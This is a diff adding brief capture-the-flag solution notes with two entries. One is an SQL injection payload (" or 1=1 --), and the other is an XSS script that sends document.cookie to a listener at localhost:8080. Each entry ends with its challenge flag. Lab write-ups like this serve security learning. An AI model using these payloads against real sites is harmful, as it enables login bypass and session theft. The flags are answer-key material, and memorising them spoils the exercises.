@@ -1,0 +1,11 @@
+* sqlinjection
+  simple (ignore bracket) ~(" or 1=1 -- )~
+  flag: little_bobby_tables_we_call_him_google_that_if_you_havent_heard_it_before 
+* xss
+  <img id="test" />
+  <script>
+  var im = document.getElementById("test");
+  var cook = document.cookie;
+  im.src = "http://localhost:8080/?cookie="+cook;
+  </script>
+  flag: if_there_was_a_little_bobby_script_alert_1_this_would_be_it
